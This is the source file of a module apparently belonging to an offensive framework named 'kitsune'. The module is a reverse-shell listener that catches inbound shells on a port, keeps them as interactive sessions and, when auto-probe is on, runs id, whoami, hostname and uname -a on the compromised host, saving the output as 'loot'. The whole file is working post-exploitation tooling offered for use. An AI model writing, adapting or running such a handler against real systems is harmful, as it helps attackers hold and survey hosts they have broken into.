"""payloads/listener — handler reverse shell'ов: live-сессии + опциональный автопроб."""

import socket
import threading
import time

from kitsune import db
from kitsune.framework import Module

PROBE_CMDS = ["id", "whoami", "hostname", "uname -a"]


class Module(Module):
    meta = {
        "name": "payloads/listener",
        "author": "kitsune",
        "description": "Reverse-shell handler: live sessions (`sessions`, `interact <id>`) + auto-probe",
        "options": {
            "port":      {"default": "4444", "required": True, "desc": "listen port"},
            "seconds":   {"default": "30", "required": False, "desc": "how long to wait for shells"},
            "autoprobe": {"default": "yes", "required": False, "desc": "collect id/uname automatically"},
        },
    }

    def run(self):
        port = int(self.port)
        wait = float(self.seconds)
        probe = self.autoprobe.lower() in ("yes", "1", "true")

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind(("0.0.0.0", port))
        except OSError as e:
            self.fail(f"can't bind :{port}: {e}")
            return
        server.listen(5)
        server.settimeout(1.0)

        self.status(f"listening on 0.0.0.0:{port} for {wait}s (Ctrl-C to stop)")
        threads = []
        end = time.time() + wait
        try:
            while time.time() < end:
                try:
                    conn, addr = server.accept()
                except socket.timeout:
                    continue
                except OSError:
                    break
                t = threading.Thread(target=self._handle, args=(conn, addr, probe), daemon=True)
                t.start()
                threads.append(t)
        except KeyboardInterrupt:
            self.warn("listener stopped by operator")
        server.close()

        if self.fw.sessions:
            self.ok(f"{len(self.fw.sessions)} live session(s) — use `sessions` / `interact <id>`")
        else:
            self.warn("no inbound shells (generate with payloads/reverse_shell)")

    def _handle(self, conn, addr, probe):
        host = addr[0]
        db_id = db.add_session(host, int(self.port))
        sess = {"host": host, "port": int(self.port), "conn": conn, "db_id": db_id}
        # регистрация сразу, пока автопроб крутится
        self.fw.sessions.append(sess)
        self.ok(f"shell connected from {host} — session live, try `sessions` / `interact <id>`")

        collected = {}
        if probe:
            conn.settimeout(2.0)
            for cmd in PROBE_CMDS:
                try:
                    conn.sendall(cmd.encode() + b"\n")
                    time.sleep(0.3)
                    data = b""
                    while True:
                        try:
                            data += conn.recv(4096)
                        except socket.timeout:
                            break
                        except OSError:
                            break
                    if data:
                        collected[cmd] = data.decode("utf-8", errors="replace").strip()[:80]
                except OSError:
                    break

        for cmd, out in collected.items():
            db.add_loot("post_enum", host, f"{cmd} -> {out}")
        if collected:
            self.status(f"auto-probe {host}: "
                        + "; ".join(f"{c}={o[:30]}" for c, o in collected.items()))
